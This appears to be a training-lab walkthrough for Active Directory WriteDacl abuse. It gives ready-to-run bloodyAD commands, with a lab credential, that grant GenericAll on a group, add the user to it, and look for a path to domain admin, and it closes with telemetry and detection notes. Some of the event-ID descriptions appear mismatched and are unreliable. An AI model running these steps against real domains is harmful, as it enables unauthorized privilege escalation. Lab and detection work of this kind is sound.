# WT#013 — ACL WriteDacl

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | lead_engineering / Eng_L3ad! (Engineering-Cadre member) |
| **Tools Required** | bloodyAD, impacket-wmiexec |
| **Certifications** | CRTE, CAPE |
| **MITRE ATT&CK** | T1098 |
| **Difficulty** | Medium |

## Prerequisites
- Engineering-Cadre group has WriteDacl on Red-Cadre group
- lead_engineering is a member of Engineering-Cadre

## Attack Steps

### Step 1 — Verify ACL via BloodHound or bloodyAD
```bash
# From kali, use bloodyAD to verify the ACE
bloodyAD --host dc01.cadre.local -d cadre.local -u lead_engineering -p 'Eng_L3ad!' get aces 'CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local'

# Expected: Engineering-Cadre has WriteDacl permission on Red-Cadre
```

### Step 2 — Grant GenericAll to lead_engineering on Red-Cadre
```bash
# Use bloodyAD WriteDacl to modify the DACL, granting GenericAll
# First, add GenericAll for lead_engineering on Red-Cadre
bloodyAD --host dc01.cadre.local -d cadre.local -u lead_engineering -p 'Eng_L3ad!' add genericall 'CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local' 'CN=lead_engineering,OU=Engineering,DC=cadre,DC=local'
```

### Step 3 — Add lead_engineering to Red-Cadre group
```bash
# Now with GenericAll on Red-Cadre, add self to the group
bloodyAD --host dc01.cadre.local -d cadre.local -u lead_engineering -p 'Eng_L3ad!' add groupmember 'CN=Red-Cadre,OU=RedCell,DC=cadre,DC=local' 'CN=lead_engineering,OU=Engineering,DC=cadre,DC=local'

# Verify membership
bloodyAD --host dc01.cadre.local -d cadre.local -u lead_engineering -p 'Eng_L3ad!' get group 'Red-Cadre'
```

### Step 4 — Exploit inherited Red-Cadre privileges
```bash
# Red-Cadre group may have additional privileges (e.g., access to restricted resources)
# Check BloodHound for Red-Cadre's effective permissions

# If Red-Cadre can write to other objects, continue escalation
# For example, check if Red-Cadre can modify other groups or users
bloodyAD --host dc01.cadre.local -d cadre.local -u lead_engineering -p 'Eng_L3ad!' search --search-base 'DC=cadre,DC=local'
```

## Post-Exploitation Chain
WT#013 → lead_engineering added to Red-Cadre → inherit Red-Cadre privileges → further ACL escalation → potential DA path

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`
- **Expected Events:**
  - Event ID 5136: Directory service object modification (DACL on Red-Cadre changed)
  - Event ID 4738: Group member added (lead_engineering → Red-Cadre)
  - Event ID 4759: Security-disabled global group change
  - Sysmon EID 1: bloodyAD.exe or python.exe process
- **BloodHound:** Attack path from lead_engineering → Red-Cadre via WriteDacl → GenericAll chain appears
- **Detection note:** WriteDacl abuse on groups produces 5136 with Attribute=`nTSecurityDescriptor`. Monitor unexpected DACL modifications on privileged groups.

## Status
CONFIGURED
